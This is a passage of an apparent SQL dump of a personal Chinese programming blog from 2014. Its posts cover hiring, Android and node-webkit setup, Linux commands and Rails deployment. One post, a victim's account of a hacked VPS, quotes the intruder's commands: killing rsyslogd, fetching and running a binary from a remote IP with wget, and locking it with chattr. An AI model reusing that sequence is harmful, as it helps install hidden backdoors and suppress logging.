学习能力如何看出来？就看一个人面对自己不感兴趣的东西时，表现出来的能力。说通俗些，找学校成绩好的，名校的，学历高的就基本没错。当初大家都认为思想政治难学，申论难学，但是学习能力强的人就能考高分。当然了，这个跟个体的差异也有关。也有学历低能力高的。但是几率太小。</p>\r\n<p>4. 对比几个平庸社招生的简历，优秀应届生完全不虚。性格，抗压能力，吃苦耐劳各方面完胜。社招生唯一的优势：略懂某技术，但是在应届生面前努力2，3个月就补回来了。 而且3个月之后，应届生会做的更好！～</p>\r\n<p>5. 稳定性更好 （一般说来，9K的工资就已经非常满足了。而1,2年经验的社招生我见过敢要年薪20W的。。。）人在软件技术团队中是非常重要的因素啊亲！在目前的互联网时代，流水的营盘流水的兵，一个人可以待上两年，对公司就是件不错的事。</p>\r\n<p>6. 可塑性更好（可以做RUBY, PYTHON , NODEJS。。。甚至是移动APP开发。。。应届生表现出来的对技术的热情远高于社招生）</p>\r\n',0,'2014-06-30 21:13:00','2014-06-30 21:23:10','2014-07-01 11:02:41',1,NULL,'freshman-vs-experienced-candidate','','','',211,'freshman-vs-experienced-candidate'),(291,'服务器被黑了(my VPS was hacked)','<p>自己的两台服务器昨天和今天早上都被福建的一个IP给黑了。 在1号服务器上他没做什么， 在2号服务器上他做的内容是：</p>\r\n<pre>killall -9 rsyslogd\r\nwget http://96.44.185.98:8080/ssh33\r\nchmod +x ssh33\r\n./ssh33\r\nchattr +i ssh33\r\n</pre>\r\n<p> 我没有搜到 ssh33 这货是啥，唯一看到的是 里面最后一行有20W个字符。包括了各种CPP啥东东，见附件。 我估计是个后门脚本。</p>\r\n<p>还在home 目录下多了一个 fack.cfg ，不知道是啥，内容是：</p>\r\n<pre>  1 0\r\n  2 106.186.19.250:106.186.19.250\r\n  3 10000:60000\r\n  4 -59\r\n</pre>\r\n<p>/var/logs/kern.log 下面多了一行： &#160;</p>\r\n<pre> 20 Jul  1 00:56:29 li539-250 kernel: imklog 5.8.6, log source = /proc/kmsg started.\r\n</pre>\r\n',0,'2014-06-30 22:19:00','2014-06-30 22:25:24','2014-06-30 22:30:09',1,NULL,'my-vps-was-hacked','','','',240,'my-vps-was-hacked'),(292,'不要过度优化 ( don\'t over-engineering, such as over-optimization ) ','<p>现在的CPU， 硬盘发展的太快了，不要过度的优化。 &#160;</p>\r\n<p>要关注产品的特点， &#160;速度达到要求即可。&#160;</p>\r\n<p>TODO： 加上例子： &#160;lotus 在DOS时代 为了优化速度，优化占用内存的空间， 耗费的大量的时间，结果 在win3.2 出现的时候被windows一举歼灭。 &#160;而且那时候硬件的发展还遵循着摩尔定律。 半年的优化时间， 早都让 CPU 翻了番了。</p>',0,'2014-07-03 05:49:00','2014-07-03 05:53:06','2014-07-03 05:53:06',1,NULL,'do-not-over-engineering-such-as-optimization','','','',196,'do-not-over-engineering-such-as-optimization'),(293,'搭建android 开发环境 (jruby )   ( setup android development in linux) ','<p>参考： <a href=\"https://github.com/ruboto/ruboto\">https://github.com/ruboto/ruboto</a>\r\n</p>\r\n<pre>$ install rbenv/ruby\r\n$ gem install ruboto\r\n$ sudo aptitude install openjdk-7-jdk ( in ubuntu) \r\n$ install android sdk\r\n$ wget http://mirrors.hust.edu.cn/apache//ant/binaries/apache-ant-1.9.4-bin.zip , then unzip it. \r\n$ vim ~/.bashrc, 把下面的变量都加进去： \r\n\r\n    ADT_PATH=/sg552/adt-bundle-linux-x86-20130522/\r\n    JAVA_HOME=/usr/lib/jvm/java-7-openjdk-amd64/\r\n    ANT_HOME=/sg552/workspace/ant-1.9.4\r\n    ANDROID_HOME=$ADT_PATH/sdk\r\n    PATH=$PATH:$ANDROID_HOME/platform-tools\r\n    PATH=$PATH:$JAVA_HOME/bin:$ANT_HOME/bin:$ANDROID_HOME/tools:$ANDROID_HOME/build-tools:$ANDROID_HOME/platform-tools\r\n    PATH=$PATH:$ANDROID_HOME/build-tools/android-4.2.2/\r\n\r\n$ gem install jruby-jars\r\n$ ruboto setup\r\n\r\n这个时候一般会报错： \r\n\r\nsg552@youku:/sg552/adt-bundle-linux-x86-20130522/sdk/build-tools/android-4.2.2$ ruboto setup\r\nWARN: Unresolved specs during Gem::Specification.reset:\r\n      rake (~&gt; 10.0)\r\nWARN: Clearing out unresolved specs.\r\nPlease report a bug if this causes problems.\r\nJava runtime             : Found\r\nJava Compiler            : Found\r\nApache ANT               : Found\r\nAndroid Package Installer: Found\r\nAndroid Emulator         : Found\r\nAndroid SDK Command adb  : Found\r\nAndroid SDK Command dx   : Found\r\nPlatform SDK android-15  : Not found\r\n\r\n    !!! Ruboto setup is NOT OK !!!\r\n\r\nAndroid platform SDK for android-15 not found.\r\nWould you like to download and install it? (Y/n): \r\n\r\n意思是问没有找到android-15这个SDK（ 它对应着 android 4.0的版本，而我们下载的是 4.4的版本， 外号叫\r\n  android 17 sdk , 所以暂时忽略这个错误）\r\n</pre>\r\n\r\n<p>然后这个程序会为我们自动安装 android-15 ， </p>\r\n<pre>Installing Archives:\r\n  Preparing to install archives\r\n  Downloading SDK Platform Android 4.0.3, API 15, revision 3\r\n  Installing SDK Platform Android 4.0.3, API 15, revision 3\r\n    Installed SDK Platform Android 4.0.3, API 15, revision 396%)\r\n  Done. 1 package installed.\r\nPlatform SDK android-15  : Found\r\nJava runtime             : Found\r\nJava Compiler            : Found\r\nApache ANT               : Found\r\nAndroid Package Installer: Found\r\nAndroid Emulator         : Found\r\nAndroid SDK Command adb  : Found\r\nAndroid SDK Command dx   : Found\r\nPlatform SDK android-15  : Found\r\n\r\n    *** Ruboto setup is OK! ***\r\n\r\n</pre>\r\n\r\n',0,'2014-07-06 01:23:00','2014-07-06 01:27:10','2014-07-06 02:07:36',1,NULL,'setup-android-development-in-linux','','','',312,'setup-android-development-in-linux'),(294,'使用wget 获取整站的内容（ using wget to fetch a full site) ','<p>安卓文档打开太麻烦，要翻墙。所以。。。。</p>\r\n<pre>$ wget --limit-rate=200k --no-clobber --convert-links --random-wait -r -p -E -e robots=off -U mozilla  http://developer.android.com\r\n</pre>\r\n<p> 现在 整个 develop.android.com 都被下载到本地了，是不是爽歪歪？ </p> \r\n\r\n<p> 参考：  <a href=\"http://www.kossboss.com/linux---wget-full-website\">http://www.kossboss.com/linux---wget-full-website</a> </p>',0,'2014-07-06 02:07:00','2014-07-06 02:10:29','2014-07-06 02:10:29',1,NULL,'fetch-a-full-site-using-wget','','','',250,'fetch-a-full-site-using-wget'),(295,'拉勾网CEO 马德龙分享  2014-07-06','<p>2014年7月5日（周六）<br />猎云网组织活动，邀请分享嘉宾 拉钩网CEO 马德龙分享<br />关于做事<br />找人：1、要找靠谱的人<br />      2、人要稳重，不自私<br />      3、有团队奉献精神，不怀疑<br />做成一件事最终要，少占小便宜，否则一旦失败，占多少股份都没用。<br />成功经验<br />1、事情的成功首先要把握用户需求；<br />①工资透明<br />②快速反馈投递结果<br />2、有3W支持<br />3、有微信给的特殊接口<br />4、认清了用户比企业（厂商）重要，对厂商特别强硬<br />5、做事容易，管人很难<br />3W的经验<br />2 99%的创业者都没有平台（产品）<br />3 如果当初散伙的3个人不是考虑太多的私事，把事做成就好了<br />4 创业8个月，估值1个亿/1000万？？（到底是一个亿还是一千万？）<br />5 58同城  低端、51job、zhaopin.com中端、Linkedin 高端市场<br />备注：前期宣传靠用户口口相传，把第一批用户培养成粉丝。</p>\r\n<p>1、 当上老板后要考虑的事情太多，焦虑，所以脾气开始急躁<br />2、 在某个关键功能点上狠下功夫，例如：面议你妹<br />3、 不给面议太多选项，对于不认真填工资的人，让客户给他电话；<br />再如：投简历秒回复，在论坛、微博上发起活动，晒最快收到面试结束时间、在技术上/非技术上都引导/强迫HR来支持这件事情等。</p>',0,'2014-07-06 09:28:00','2014-07-06 09:29:24','2014-07-06 09:29:24',1,NULL,'lagou-jingyan','','','',210,'lagou-jingyan'),(296,'在线打开 word  (open word file online ) ','<p>\r\n  今天收到几个简历， 在LINUX 和 MAC上都无法打开（51job 生成的）  ，  结果，只好用一个在线打开DOC的网址：  \r\n</p>\r\n<a href=\"https://onedrive.live.com/\">https://onedrive.live.com/</a>\r\n<p>太简单了啊。o(∩∩)o...哈哈&#160;</p>',0,'2014-07-07 05:28:00','2014-07-07 05:31:45','2014-07-07 05:31:45',1,NULL,'open-word-file-online','','','',203,'open-word-file-online'),(297,'使用 greplace/gsearch ( using greplace vim plugin) ','<p>这几天发现我的vim 插件 greplace不好使了。 每次使用 \r\n</p>\r\n<pre> :Gsearch -F \'some_string\' -R --include=*rb \r\n</pre>\r\n都会报错。\r\n\r\n<p>解决办法：  （在后面加个 . ) </p>\r\n<pre> :Gsearch -F \'some_string\' -R --include=*rb .  \r\n</pre>',0,'2014-07-07 05:31:00','2014-07-07 05:33:45','2014-07-07 05:33:45',1,NULL,'using-greplace-vim-plugin','','','',248,'using-greplace-vim-plugin'),(298,'购买godaddy域名的流程：   ( setup your domain step by step) ','<p> 购买域名的流程： </p>\r\n<p>\r\n1. 在godaddy注册 （千万不要在 www.net.cn 上。 国内的域名需要备案。你懂的。）     <br />\r\n2. 选个自己的域名， 例如： sujingyi.com  （现在还没有人注册～ ） <br /><img src=\"/system/images/BAhbBlsHOgZmSSJEMjAxNC8wNy8wNy8xN18xMF8xNV8zODZfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDdfMDdfMTdfMDFfMjQucG5nBjoGRVQ/Screenshot%20from%202014-07-07%2017png:24.:ext\" title=\"Screenshot From 2014 07 07 17:01:24\" alt=\"Screenshot From 2014 07 07 17:01:24\" rel=\"225x255\" width=\"1280.1818182468414\" height=\"800.1818182468414\" /><br /><br />&#160;<br /><br />3. 付费 <br />\r\n4. 登录后台， <br />\r\n  4.1 点击 Visit My account, 在对应的 Domains 那里，点击 Launch. <br /><img src=\"/system/images/BAhbBlsHOgZmSSJEMjAxNC8wNy8wNy8xN18wOV81MV8yMjFfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDdfMDdfMTZfNDRfMjAucG5nBjoGRVQ/Screenshot%20from%202014-07-07%2016png:20.:ext\" title=\"Screenshot From 2014 07 07 16:44:20\" alt=\"Screenshot From 2014 07 07 16:44:20\" rel=\"225x255\" width=\"1280.1818182468414\" height=\"800.1818182468414\" /><br /><br />&#160; &#160;<br />4.2 会显示出一个列表，你刚才购买的域名就在里面。 点击之。 <br />\r\n  4.3 点击  DNS Zone file, 会看到你的域名的指向配置。 配置A 地址中的 @ 和 www 指向 106.186.19.250 就好。   <br />\r\n       (其他的， 比如 Nameserver 啥的，都不用改） <br /><br /><img src=\"/system/images/BAhbBlsHOgZmSSJEMjAxNC8wNy8wNy8xN18xMF8yNV8yMTZfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDdfMDdfMTZfNDVfMTgucG5nBjoGRVQ/Screenshot%20from%202014-07-07%2016png:18.:ext\" title=\"Screenshot From 2014 07 07 16:45:18\" alt=\"Screenshot From 2014 07 07 16:45:18\" rel=\"225x255\" width=\"1280.1818182468414\" height=\"800.1818182468414\" /><br /><br />\r\n  4.4 保存。 <br />\r\n（详细的步骤如果不懂，请百度） <br />\r\n</p>\r\n<p>验证的方式：\r\n</p>\r\n<pre>$ ping sujingyi.com   </pre>\r\n<p>如果给出的IP地址跟你刚才配置的地址一致，说明你的IP地址配对了。\r\n</p>\r\n<pre>64 bytes from li539-250.members.linode.com (106.186.19.250): icmp_req=1 ttl=47 time=83.4 ms\r\n</pre>',0,'2014-07-07 08:47:00','2014-07-07 08:50:19','2014-07-07 09:11:11',1,NULL,'setup-your-domain-step-by-step','','','',246,'setup-your-domain-step-by-step'),(299,'死亡项目的特点','<p>1. 沟通不够（特别是异地外包项目）</p>\r\n<p>2. 没有妹子，都是爆脾气的汉子（沟通的重要性）</p>\r\n<p>3. 需求经常变动。一句话需求。（我们要做成跟XX一样）</p>\r\n<p>4. 开发人员没有节奏。（ 每15分钟被打算一次， 另外，需求不断变更）</p>\r\n<p>5. 外包：不要找太便宜的人做。 &#160;</p>\r\n<p>6. 人员变动的厉害 （软件项目，最重要的是人啊亲！)&#160;</p>\r\n<p>7. 周期太长（大于6个月的项目失败几率都特别大）</p>',0,'2014-07-12 11:59:00','2014-07-12 12:03:27','2014-07-12 23:34:13',1,NULL,'why-project-failed','','','',180,'why-project-failed'),(300,'拿什么拯救你，我的遗留项目？ ','<p>接手遗留项目的特点：&#160;</p>\r\n<p>1. 代码都很烂。</p>\r\n<p>2. BUG 多多。 容易宕机</p>\r\n<p>3. 部署麻烦。有 ftp 部署的。 有直接 svn up更新代码的。</p>\r\n<p>4. 架构有问题。 &#160;</p>\r\n<p>5. 接盘的人必须技能大约前任作者。否则看不懂代码。</p>\r\n<p>6. 处于崩溃（服务器死机， 或者进展极其缓慢） 边缘。&#160;</p>\r\n<p>解决办法：</p>\r\n<p>1. 该推倒的就推倒重做。(前提： 项目组中存在 资深元老级用户，知道这个系统的所有功能点，知道哪些可以砍掉，哪些需要保留）</p>\r\n<p>2. 80%情况下无法推倒，那么就先精简代码。 做重构。添加测试。 总之原则： &#160;改善现有的项目体系（代码层面， 业务逻辑层面， 部署运维层面， 架构层面）</p>\r\n<p>3.&#160;</p>',0,'2014-07-12 23:34:00','2014-07-12 23:39:15','2014-07-12 23:39:15',1,NULL,'how-to-work-on-an-existing-project','','','',178,'how-to-work-on-an-existing-project'),(301,'Linux 的几个好用的命令 ( sweet commands in linux) ','<p> 这是一个循环，把 /tmp/test.lst 文件中的 每一行都读出来，然后循环运行rsync 命令 . (注意其中的 exclude ) ( a loop that reads all the lines of contents in a file named /tmp/test.lst and then run them one by one)  </p>\r\n<pre>for i in `cat /tmp/test.lst`;do\r\nrsync -avzPl --exclude=\"2013*\" --exclude=\"201404*\" --exclude=\'*.log*\' --exclude=\'*.git\' --exclude=\'*.sql\' ./$i 10.103.13.37::cmscode\r\ndone\r\n</pre>\r\n\r\n<p> 在当前目录下，找到所有的文件中包含的 10.103.13.74 ，并且把它替换成：  10.103.13.37  ( find all the \'10.103.13.74\' and then replace them with \'10.103.13.37\') 这个功能跟 VIM plugin:  Greplace 是一样的。</p>\r\n<pre>sed -i \"s/10.103.13.74/10.103.13.37/g\" `grep \"10.103.13.74\" -rl ./`\r\n</pre>',0,'2014-07-15 00:30:00','2014-07-15 00:35:24','2014-07-15 00:35:24',1,NULL,'sweet-commands-examples-in-linux','','','',195,'sweet-commands-examples-in-linux'),(302,'如何查看自己的CPU是 64 还是32位的？( how to determin a cpu is 32 or 64 bit? )','<p>参考： <a href=\"http://stackoverflow.com/questions/246007/how-to-determine-whether-a-given-linux-is-32-bit-or-64-bit\" target=\"_blank\">http://stackoverflow.com/questions/246007/how-to-determine-whether-a-given-linux-is-32-bit-or-64-bit</a> </p>\r\n<p>1.  $  uname -m </p> \r\n<pre>x86_64 ==&gt; 64-bit kernel\r\ni686   ==&gt; 32-bit kernel\r\n</pre>\r\n\r\n<p>2. $ lscpu </p>\r\n\r\n<p>3. $ grep flag /proc/cpuinfo  ， 具有：  lm ==&gt; 64-bit processor  就是 64位的啦 </p>\r\n',0,'2014-07-16 06:09:00','2014-07-16 06:12:10','2014-07-16 06:12:10',1,NULL,'','','','',213,'cpu-64-32-how-to-determin-a-cpu-is-32-or-64-bit'),(303,'copy all files from gem folder to rails folder','<p>$ cd &lt;gem_folder&gt;</p>\r\n<p>$ cp -r app config lib &lt;rails_folder&gt;</p>\r\n<p>不过这个方法不够好，因为 script 目录下的文件容易被覆盖 ( local.yml, routes.rb 等） ，最好的办法还是让这个 gem 单独写个rake 任务，（例如： rake your_gem:override ） &#160;( the best solution is use the gem\'s method : override if there is )&#160;</p>\r\n<p>一般来说， copy app 目录就可以了。 例如： config/routes, config/local 目录一般不用COPY，因为看controller, &#160; view是最重要的。</p>',0,'2014-07-20 02:22:00','2014-07-20 02:27:32','2014-07-20 02:41:04',1,NULL,'copy-all-files-from-gem-folder-to-rails-folder','','','',173,'copy-all-files-from-gem-folder-to-rails-folder'),(304,'查看crontab 最后一次被修改的时间','<p>查看crontab 最后一次被修改的时间：</p>\r\n<p>01:14 [root@a01.download.3g.suzhou.yoqoo]$ ls -l /var/spool/cron/root <br />-rw-------  1 root root 297 Apr 17 10:29 /var/spool/cron/root<br /></p>',0,'2014-07-23 17:15:00','2014-07-23 17:16:04','2014-07-23 17:16:04',1,NULL,'','','','',152,'crontab'),(305,'Linux 清理缓存的办法 ( free memories in linux)','<p>1. 查看当前的内存状态： $free -m &#160; ( &#160; check current memory usage )&#160;</p>\r\n<p>或者 使用 $top , 然后 c, 1 &#160;( or $top, press c, 1 )&#160;</p>\r\n<p>2. $ sync&#160;</p>\r\n<p>3. $ echo 3 &gt; /proc/sys/vm/drop_caches&#160;</p>\r\n\r\n<p> Before free: </p>\r\n<pre>root@li539-250:/opt/app/siwei/wawa_site/config# free -m\r\n             total       used       free     shared    buffers     cached\r\nMem:          4000       3661        338          0        964        909\r\n-/+ buffers/cache:       1787       2212\r\nSwap:          499          0        499\r\n\r\n</pre>\r\n\r\n<p> After free: （可以看出， 释放了2G的内存） &#160;</p>\r\n<pre>root@li539-250:/opt/app/siwei/wawa_site/config# free -m\r\n             total       used       free     shared    buffers     cached\r\nMem:          4000       1697       2303          0          2         38\r\n-/+ buffers/cache:       1655       2344\r\nSwap:          499          0        499\r\n</pre>',0,'2014-07-24 06:31:00','2014-07-24 06:33:52','2014-07-24 06:33:52',1,NULL,'free-memories-in-linux','','','',155,'free-memories-in-linux'),(306,'使用node-webkit来创建桌面应用( creating desktop app using node-webkit)','<p>the tutorial is :&#160;</p>\r\n<p>\r\nCreate index.html:\r\n</p>\r\n<pre>&lt;html&gt;\r\n&lt;body&gt;\r\n&lt;h1&gt;Hello World!&lt;/h1&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n</pre>\r\n<p>Create package.json:</p>\r\n<pre>{\r\n  \"name\": \"nw-demo\",\r\n  \"main\": \"index.html\"\r\n}\r\n</pre>\r\n<p>\r\nCompress index.html and package.json into a zip archive, and rename it to app.nw:\r\n</p>\r\n<pre>$ zip app.nw index.html package.json\r\n\r\napp.nw\r\n|-- package.json\r\n`-- index.html\r\n</pre>\r\n<p>\r\nDownload the prebuilt binary for your platform and use it to open the app.nw file:</p>\r\n\r\n$ ./nw app.nw',0,'2014-07-25 11:17:00','2014-07-25 11:21:49','2014-07-25 11:21:49',1,NULL,'','','','',282,'node-webkit-creating-desktop-app-using-node-webkit'),(307,'发布node-webkit的几种方法','<a href=\"https://github.com/rogerwang/node-webkit/wiki/How-to-package-and-distribute-your-apps\">https://github.com/rogerwang/node-webkit/wiki/How-to-package-and-distribute-your-apps</a>',0,'2014-07-25 23:20:00','2014-07-25 23:21:43','2014-07-25 23:21:43',1,NULL,'','','','',267,'node-webkit'),(308,'node-webkit(npm)中安装第三方包（如jquery, coffeescript) ( install jquery, coffeescript under node/node-webkit)','<p>$ rm ~/tmp -rf</p>\r\n<p>$ cd &lt;your_project&gt;</p>\r\n<p>$ npm install jquery</p>\r\n<p>$ npm install coffee-script</p>\r\n<p>如何调用？ &#160;下面是一个例子：</p>\r\n\r\n<pre>&lt;!DOCTYPE html&gt;<br />&lt;html&gt;<br />  &lt;head&gt;<br />    &lt;title&gt;Hello World!&lt;/title&gt;<br />    &lt;script&gt;<br />      require(\'coffee-script/register\');<br />      $ = require(\'jquery\');<br />    &lt;/script&gt;<br />  &lt;/head&gt;<br />  &lt;body&gt;<br />    &lt;h1&gt;Hello World!&lt;/h1&gt;<br />    We are using node.js &lt;script&gt;document.write(process.version)&lt;/script&gt;.<br />  &lt;/body&gt;<br />  &lt;script&gt;<br />    alert($(\'body h1\').html());<br />  &lt;/script&gt;<br />&lt;/html&gt;<br />\r\n</pre>',0,'2014-07-25 23:21:00','2014-07-25 23:38:03','2014-07-26 02:49:25',1,NULL,'','','','',368,'node-webkit-npm-jquery-coffeescript-install-jquery-coffeescript-under-node-node-webkit'),(309,'node-webkit上手体验( first glance at node-webkit )','<p>1. 引用 lib时，要记得定义一个变量，来在后面的页面调用它。比如最经典的jquery:  \r\n</p>\r\n<pre> var $ = require(\'jquery\')\r\n</pre>\r\n<p>2. 使用 &#160;$ npm install &lt;lib_name&gt; 来安装 （node 知识）</p>\r\n<p>3. 使用前最好前过一遍wiki 的基本内容。 让你对它的 build, package, run ， namespace 等有一个大概的了解。</p>\r\n<p>4. 把里面的代码能走的就走一遍，</p>\r\n<p>5. 对于这个app的应用的设置（页面的宽度，初始形状等等），都在package.json, &#160;注意其中的 iframe 选项， 它甚至可以把 浏览器的 地址栏， 和状态栏等等全都取消， 看起来完全就是个 桌面app. &#160;</p>\r\n<p>6. 还能设置 tray 哦亲！ （桌面右下角的小图标）</p>\r\n<p>7. 注意其中的scope. &#160;它跟正常的浏览器的 &#160;&lt;script src=\'\'/&gt; 还是不一样的。 require（‘’）调用的是node的模块， 它会先进行一系列的 编译等操作。 &#160;而 &lt;script src=\'some_file.js\'/&gt; 则是最最普通的 操作。 &#160;跟日常WEB浏览的行为是一样的。 &#160;我今早就是被它搞了1个半小时，没有啥进展。&#160;</p>\r\n<p>8. &#160;下午又在scope上耗费一宝贵小时。。。 我会在下个帖子中详细写。</p>\r\n\r\n\r\n',0,'2014-07-26 03:59:00','2014-07-26 04:00:46','2014-07-26 08:31:34',1,NULL,'','','','',274,'node-webkit-first-glance-at-node-webkit'),(310,'在 node-webkit中使用数据库 (using db in node-webkit)','<p>参考：  <a href=\"https://github.com/rogerwang/node-webkit/wiki/Save-persistent-data-in-app\">https://github.com/rogerwang/node-webkit/wiki/Save-persistent-data-in-app</a>\r\n</p>\r\n<p>1. web SQL database &#160;（我想说： 太麻烦了吧！ 本来 javascript语言就充满了各种无用的 {}, (), ; ， 现在还要写raw SQL. &#160;好消息是 这个技术能用。 另一个好消息是替代产品已经出来了）</p>\r\n\r\n<pre>&lt;script&gt;\r\n      var db = openDatabase(\'auto_cart\', \'1.0\', \'db of auto_cart\', 2 * 1024 * 1024)\r\n      db.transaction(function(tx){\r\n        tx.executeSql(\'create table if not exists conditions(id unique, text)\');\r\n        tx.executeSql(\'insert into conditions(id ,text) values (1, \"cpu condition\")\');\r\n        tx.executeSql(\'insert into conditions(id ,text) values (2, \"memory condition\")\');\r\n      });\r\n\r\n      db.transaction(function(tx){\r\n        tx.executeSql(\'select * from conditions\', [], function(tx, results){\r\n          var len = results.rows.length, i;\r\n          for (i = 0; i&lt; len; i++){\r\n            alert(results.rows.item(i).text);\r\n          }\r\n        });\r\n      });\r\n&lt;/script&gt;\r\n</pre>\r\n<p>2.&#160;</p>',0,'2014-07-26 06:42:00','2014-07-26 06:53:45','2014-07-26 06:56:15',1,NULL,'','','','',829,'node-webkit-using-db-in-node-webkit'),(311,'node 中的 context / scope ( node-webkit context) ','<p>node 中，每段js 都会有自己的 context &#160;. 这点理解起来跟ruby, raw html/js很不一样。</p>\r\n<p>看看官方的说法： (<a href=\"https://github.com/rogerwang/node-webkit/wiki/Differences-of-JavaScript-contexts\">https://github.com/rogerwang/node-webkit/wiki/Differences-of-JavaScript-contexts</a>\r\n\r\n</p>\r\n<ul>\r\n<li>If the require() method (of Node.js modules API) is used, then the required module runs in the Node\'s context. (When you call the require() function or a function from some required module, the JS engine enters the Node\'s context and leaves it after the function returns.)</li>\r\n\r\n<li>If HTML &lt;script src=\"...\"&gt; element (or jQuery\'s $.getScript(), or any other similar method) is used in some window, then the script runs in the context of that window.</li>\r\n\r\n<li>If the module is given as the value of the \"node-main\" property of the application\'s manifest file, then the module runs in the Node\'s context but later has access to the window object. (See the “node-main” article for details.)</li>\r\n</ul>\r\n\r\n <p>总之，它有3个不同的 context &#160;。 实际上用起来是这个效果：</p>\r\n<p>想让JS在全局生效， 需要在package.json 中设置 \'node-main\' 这个属性， 例如 </p>\r\n<p> 1. package.json </p>\r\n<pre>{\r\n  \"name\": \"nw-demo\",\r\n  \"node-main\": \"index.js\",\r\n  \"main\": \"index.html\"\r\n}\r\n</pre>\r\n\r\n<p>2 .index.js:  </p>\r\n<pre>var i = 0;\r\nexports.callback0 = function () {\r\n    console.log(i + \": \" + window.location);\r\n    window.alert (\"i = \" + i);\r\n    i = i + 1;\r\n}\r\n</pre>\r\n<p> 3. 最后，在HTML中引用这个方法： </p>\r\n<pre>&lt;body onload=\"process.mainModule.exports.callback0()\"&gt;\r\n</pre>\r\n<p>但是，如果在 &#160;index.js 中引入 jQuery, 会报错： &#160;jquery 需要一个 window, document啥啥的。</p>\r\n<p>所以， 我们需要下面的代码： &#160;（也就是说，每一个HTML都要有自己的 $ = require(\'jquery\') )&#160;</p>\r\n\r\n<pre>  &lt;div id=\'target_site\'&gt;&lt;/div&gt;\r\n  &lt;script&gt;\r\n    url = \'http://siwei.me\'\r\n    $ = require(\'jquery\')\r\n    request = require(\'request\')\r\n    request(url, function(error, response, body){\r\n      if (!error &amp;&amp; response.statusCode == 200 ) {\r\n        $(\'#target_site\').html(body)\r\n        //console.info(body)\r\n        alert(\'ok!\')\r\n      }\r\n    })\r\n\r\n</pre>',0,'2014-07-26 08:31:00','2014-07-26 08:44:48','2014-07-26 08:44:48',1,NULL,'','','','',727,'node-context-scope-node-webkit-context'),(312,'ruby on rails 是web开发王道啊亲！','<p>22分钟从0 搭建环境， 写出一个假接口， 调通前端后端，再来16 分钟使用真实数据 + 润色。</p>\r\n\r\n<p>换另外一个语言试试。。。。</p>\r\n\r\n<img src=\"http://f.hiphotos.bdimg.com/album/w%3D2048/sign=6eeb3c0163d9f2d3201123ef9dd48b13/0d338744ebf81a4c4410ef29d62a6059252da62b.jpg\" /> <br />\r\n<p>精锐游击队一样干掉 战五渣 正规军</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSIiMjAxNC8wNy8yNi8xOV8wMF8wOV8yMzZfXy5wbmcGOgZFVA/%E6%88%98%E4%BA%94%E6%B8%A3.png\" title=\"战五渣\" alt=\"战五渣\" rel=\"450x450\" width=\"653\" height=\"719\" /></p>',0,'2014-07-26 10:55:00','2014-07-26 11:02:03','2014-07-26 11:02:03',1,NULL,'','','','',301,'ruby-on-rails-web'),(313,'delayed_job 由于deadlock而死掉： (Mysql2::Error: Deadlock when attempting to lock a job )','<p>近期一直遇到这个问题： &#160;delayed_job 由于deadlock而死掉： ( 报错是： Mysql2::Error: Deadlock when attempting to lock a job ) &#160;(these days I am being troubled by this problem)&#160;</p>\r\n<p>解决办法1： &#160; (solution 1)&#160;</p>\r\n<p>使用 god 的keepalive特性来控制它。 &#160; 这个方法非常丑陋，不建议使用（ 它会一直占用一个进程， 100% 的CPU占用率）</p>\r\n<p>解决办法2： ( solution2)&#160;</p>\r\n<p>refer to: \r\n<a target=\"_blank\" href=\"https://github.com/collectiveidea/delayed_job_active_record/issues/63#issuecomment-25468573\" style=\"background-color: transparent;\">https://github.com/collectiveidea/delayed_job_active_record/issues/63#issuecomment-25468573</a>\r\n\r\n</p>\r\n<pre># in your Gemfile: \r\n#gem \'delayed_job_active_record\', \'4.0.1\'\r\ngem \'delayed_job_active_record\', git: \'https://github.com/aaronjensen/delayed_job_active_record.gi\r\nt\', branch: \'retry-deadlock-on-delete\'\r\n</pre>\r\n\r\n',0,'2014-07-29 01:31:00','2014-07-29 01:36:11','2014-08-03 02:32:50',1,NULL,'','','','',278,'delayed_job-deadlock-mysql2-error-deadlock-when-attempting-to-lock-a-job'),(314,'jquery不工作 (jquery not working/trigger ) ','<p>refer to: <a href=\"http://stackoverflow.com/a/25011343/445908\">http://stackoverflow.com/a/25011343/445908</a> </p>\r\n<p>in my case there are multiple forms in current page, and I am using : </p>\r\n<p>    $(\'form\').validate()  </p>\r\n<p>which makes jQuery.validate confused. &#160;&#160;solution:  assign a specify ID selector for your form.  e.g.\r\n</p>\r\n<p>    $(\'#my_form_id\').validate()</p>\r\n<p>简言之： &#160;为你的form 指定一个ID～&#160;</p>',0,'2014-07-29 08:39:00','2014-07-29 08:40:39','2014-07-29 08:41:48',1,NULL,'','','','',239,'jquery-jquery-not-working-trigger'),(315,'ubuntu + win7 双系统 (install ubuntu + win7)','<p>1.在win7下找到一个空盘，比如E盘，先格式化E盘，然后压缩卷，出现绿色。&#160;</p>\r\n<p>2.然后用光盘安装ubuntu12.04，找到freespace，最关键的就是分区这里了：可以参照 <a href=\"http://blog.sina.com.cn/s/blog_5f0a505101017s5n.html\">http://blog.sina.com.cn/s/blog_5f0a505101017s5n.html </a>  安装过程中的手动分区。\r\n</p>',0,'2014-07-29 10:38:00','2014-07-29 10:39:53','2014-07-29 10:39:53',1,NULL,'','','','',242,'ubuntu-win7-install-ubuntu-win7'),(316,'这才是解决问题的速度','<p>3天前在node-webkit上提出了个BUG： 没有运行在64位MAC上的版本。结果2天前对方给了我回复。我今天去官方站点一看，居然都已经出来了。&#160;</p>\r\n<p>这才是解决问题的速度！ rogerwang (node-webkit的作者）好样的！</p>\r\n<p>refer to: <a href=\"https://github.com/rogerwang/node-webkit/issues/2133\">https://github.com/rogerwang/node-webkit/issues/2133</a>\r\n</p>',0,'2014-07-31 11:54:00','2014-07-31 11:55:59','2014-07-31 11:55:59',1,NULL,'','','','',138,''),(317,'rails 部署时Gemfile  相关的内容( Gemfiles related stuff when deploying Rails app to production) ','<p>1. 最好指定好具体的版本, .e.g: &#160;(give the explicit version )&#160;</p>\r\n<pre>source \'http://ruby.taobao.org\'\r\n\r\ngem \'rails\', \'4.0.0\'\r\ngem \'uglifier\', \'2.4.0\'\r\ngem \'coffee-rails\', \'4.0.1\'\r\n</pre> \r\n<p>2. $ bundle package --all</p>\r\n<p>3. 在 config/deploy.rb 中，执行 bundle install --local --without=test , e.g. </p>\r\n<pre>  task :db_migrate do\r\n    run \"cd #{release_path} &amp;&amp; bundle install --local\"\r\n    run \"cd #{release_path} 